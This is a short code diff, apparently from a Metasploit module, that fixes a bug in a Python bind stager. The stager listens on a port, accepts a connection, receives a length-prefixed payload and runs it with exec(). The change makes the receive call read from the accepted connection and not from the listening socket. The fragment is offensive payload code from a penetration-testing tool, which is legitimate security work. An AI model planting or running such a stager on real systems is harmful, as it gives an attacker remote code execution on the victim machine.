@@ -39,7 +39,7 @@ module Metasploit3
 		cmd += "s.listen(1)\n"
 		cmd += "c,a=s.accept()\n"
 		cmd += "l=struct.unpack('>I',c.recv(4))[0]\n"
-		cmd += "d=s.recv(4096)\n"
+		cmd += "d=c.recv(4096)\n"
 		cmd += "while len(d)!=l:\n"
 		cmd += "\td+=c.recv(4096)\n"
 		cmd += "exec(d,{'s':c})\n"
